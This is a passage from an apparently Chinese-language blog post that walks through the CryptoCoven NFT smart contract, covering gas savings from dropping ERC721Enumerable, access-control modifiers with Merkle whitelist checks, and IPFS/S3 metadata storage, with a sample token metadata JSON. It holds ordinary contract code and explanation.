.d``            .88           u.                       u.    88Nu.   u.                u.    u.  </span><br><span class="line">      .    .d88B :@8c  9888i   .dL   @8Ne.   .u     :888ooo  ...ue888b           .    ...ue888b  &#x27;88888.o888c      .u     x@88k u@88c.</span><br><span class="line"> .udR88N  =&quot;8888f8888r `Y888k:*888.  %8888:u@88N  -*8888888  888R Y888r     .udR88N   888R Y888r  ^8888  8888   ud8888.  ^&quot;8888&quot;&quot;8888&quot;</span><br><span class="line">&lt;888&#x27;888k   4888&gt;&#x27;88&quot;    888E  888I   `888I  888.   8888     888R I888&gt;    &lt;888&#x27;888k  888R I888&gt;   8888  8888 :888&#x27;8888.   8888  888R </span><br><span class="line">9888 &#x27;Y&quot;    4888&gt; &#x27;      888E  888I    888I  888I   8888     888R I888&gt;    9888 &#x27;Y&quot;   888R I888&gt;   8888  8888 d888 &#x27;88%&quot;   8888  888R </span><br><span class="line">9888        4888&gt;        888E  888I    888I  888I   8888     888R I888&gt;    9888       888R I888&gt;   8888  8888 8888.+&quot;      8888  888R </span><br><span class="line">9888       .d888L .+     888E  888I  uW888L  888&#x27;  .8888Lu= u8888cJ888     9888      u8888cJ888   .8888b.888P 8888L        8888  888R </span><br><span class="line">?8888u../  ^&quot;8888*&quot;     x888N&gt;&lt;888&#x27; &#x27;*88888Nu88P   ^%888*    &quot;*888*P&quot;      ?8888u../  &quot;*888*P&quot;     ^Y8888*&quot;&quot;  &#x27;8888c. .+  &quot;*88*&quot; 8888&quot;</span><br><span class="line"> &quot;8888P&#x27;      &quot;Y&quot;        &quot;88&quot;  888  ~ &#x27;88888F`       &#x27;Y&quot;       &#x27;Y&quot;          &quot;8888P&#x27;     &#x27;Y&quot;          `Y&quot;       &quot;88888%      &quot;&quot;   &#x27;Y&quot;  </span><br><span class="line">   &quot;P&#x27;                         88F     888 ^                                  &quot;P&#x27;                                &quot;YP&#x27;                 </span><br><span class="line">                              98&quot;      *8E                                                                                            </span><br><span class="line">                            ./&quot;        &#x27;8&gt;                                                                                            </span><br><span class="line">                           ~`           &quot;                                                                                             </span><br><span class="line"></span><br><span class="line">.・。.・゜✭・.・✫・゜・。..・。.・゜✭・.・✫・゜・。.✭・.・✫・゜・。..・✫・゜・。.・。.・゜✭・.・✫・゜・。..・。.・゜✭・.・✫・゜・。.✭・.・✫・゜・。..・✫・゜・。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3><span id="bi-mian-shi-yong-erc721enumerable">避免使用 ERC721Enumerable</span></h3><p>使用 <code>ERC721Enumerable</code> 会带来大量 gas 消耗，合约中使用 <code>ERC721 + Counters</code> 的方式节省 Gas。主要原因是由于 <code>totalSupply()</code> 函数的使用。</p><p>详细可以阅读文章：<a href="https://shiny.mirror.xyz/OUampBbIz9ebEicfGnQf5At_ReMHlZy0tB4glb9xQ0E">Cut Minting Gas Costs By Up To 70% With One Smart Contract Tweak</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract CryptoCoven is ERC721, IERC2981, Ownable, ReentrancyGuard &#123;</span><br><span class="line">    using Counters for Counters.Counter;</span><br><span class="line">    using Strings for uint256;</span><br><span class="line"></span><br><span class="line">    Counters.Counter private tokenCounter;</span><br></pre></td></tr></table></figure><h3><span id="xiu-gai-qi-rang-dai-ma-geng-jian-ji-he-qing-xi">修改器让代码更简洁和清晰</span></h3><p>合约中使用修改器对权限进行控制，其中包括：</p><ul><li><code>publicSaleActive</code> 公开销售状态</li><li><code>communitySaleActive</code> 社区销售状态</li><li><code>maxWitchesPerWallet</code> 每个钱包最大 token 数量</li><li><code>canMintWitches</code> 控制token总数量</li><li><code>canGiftWitches</code></li><li><code>isCorrectPayment</code> 判断购买时价格是否正确</li><li><code>isValidMerkleProof</code> 用于白名单机制中的 Merkle 验证</li></ul><p>这些修改器可以使得权限控制更简便，代码的可读性也大大提升。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ============ ACCESS CONTROL/SANITY MODIFIERS ============</span><br><span class="line"></span><br><span class="line">    modifier publicSaleActive() &#123;</span><br><span class="line">        require(isPublicSaleActive, &quot;Public sale is not open&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier communitySaleActive() &#123;</span><br><span class="line">        require(isCommunitySaleActive, &quot;Community sale is not open&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier maxWitchesPerWallet(uint256 numberOfTokens) &#123;</span><br><span class="line">        require(</span><br><span class="line">            balanceOf(msg.sender) + numberOfTokens &lt;= MAX_WITCHES_PER_WALLET,</span><br><span class="line">            &quot;Max witches to mint is three&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier canMintWitches(uint256 numberOfTokens) &#123;</span><br><span class="line">        require(</span><br><span class="line">            tokenCounter.current() + numberOfTokens &lt;=</span><br><span class="line">                maxWitches - maxGiftedWitches,</span><br><span class="line">            &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier canGiftWitches(uint256 num) &#123;</span><br><span class="line">        require(</span><br><span class="line">            numGiftedWitches + num &lt;= maxGiftedWitches,</span><br><span class="line">            &quot;Not enough witches remaining to gift&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            tokenCounter.current() + num &lt;= maxWitches,</span><br><span class="line">            &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isCorrectPayment(uint256 price, uint256 numberOfTokens) &#123;</span><br><span class="line">        require(</span><br><span class="line">            price * numberOfTokens == msg.value,</span><br><span class="line">            &quot;Incorrect ETH value sent&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isValidMerkleProof(bytes32[] calldata merkleProof, bytes32 root) &#123;</span><br><span class="line">        require(</span><br><span class="line">            MerkleProof.verify(</span><br><span class="line">                merkleProof,</span><br><span class="line">                root,</span><br><span class="line">                keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">            ),</span><br><span class="line">            &quot;Address does not exist in list&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="nft-su-cai-de-cun-chu">NFT 素材的存储</span></h3><p>NFT 项目都需要包含图片的存储，合约将 NFT 对应的元信息存储在 IPFS 中，并将对应的图片存储都在 Amazon S3 存储中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private baseURI;    </span><br><span class="line"></span><br><span class="line">function setBaseURI(string memory _baseURI) external onlyOwner &#123;</span><br><span class="line">    baseURI = _baseURI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC721Metadata-tokenURI&#125;.</span><br><span class="line"> */</span><br><span class="line">function tokenURI(uint256 tokenId)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    returns (string memory)</span><br><span class="line">&#123;</span><br><span class="line">    require(_exists(tokenId), &quot;Nonexistent token&quot;);</span><br><span class="line"></span><br><span class="line">    return</span><br><span class="line">        string(abi.encodePacked(baseURI, &quot;/&quot;, tokenId.toString(), &quot;.json&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如 <code>tokenId</code> 为 <code>1</code> 的 NFT，对应的 <code>tokenURI</code> 为 <code>ipfs://QmZHKZDavkvNfA9gSAg7HALv8jF7BJaKjUc9U2LSuvUySB/1.json</code>，在 IPFS 中可以看到这里面的内容为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are a WITCH of the highest order. You are borne of chaos that gives the night shape. Your magic spawns from primordial darkness. You are called oracle by those wise enough to listen. ALL THEOLOGY STEMS FROM THE TERROR OF THE FIRMAMENT!&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;external_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.cryptocoven.xyz/witches/1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cryptocoven.s3.amazonaws.com/nyx.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;background_color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Background&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sepia&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Skin Tone&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Dawn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Body Shape&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lithe&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Top&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sheer Top (Black)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eyebrows&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Medium Flat (Black)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eye Style&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eye Color&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cloud&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mouth&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx (Mocha)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hair (Front)&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hair (Back)&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx Long&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hair Color&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Steel&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hat&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Witch (Black)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Necklace&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Moon Necklace (Silver)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Archetype of Power&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Witch of Woe&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sun Sign&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Taurus&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Moon Sign&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Aquarius&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Rising Sign&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Capricorn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Will&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wisdom&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wonder&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Woe&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wit&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wiles&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;coven&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Witch of Woe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are a WITCH of the highest order.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;hobby&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are borne of chaos that gives the night shape.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Your magic spawns from primordial darkness.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;typeSpecific&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are called oracle by those wise enough to listen.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;exclamation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ALL THEOLOGY STEMS FROM THE TERROR OF THE FIRMAMENT!&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;skills&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;will&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wisdom&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wonder&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;woe&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wit&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wiles&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;birthChart&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;sun&quot;</span><span class="punctuation">:</span> <span class="string">&quot;taurus&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;moon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aquarius&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;rising&quot;</span><span class="punctuation">:</span> <span class="string">&quot;capricorn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;styles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;background&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solid&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sepia&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;background_solid_sepia&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;base&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lithe&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dawn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;base_lithe_dawn&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body-under&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sheer-top&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body-under_sheer-top_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyebrows&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;medium-flat&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyebrows_medium-flat_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyes&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cloud&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyes_nyx_cloud&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mouth&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mocha&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mouth_nyx_mocha&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-back&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;steel&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-back_nyx_steel&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-bangs&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;steel&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-bangs_nyx_steel&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-back&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;witch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-back_witch_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-front&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;witch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-front_witch_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;necklace&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span 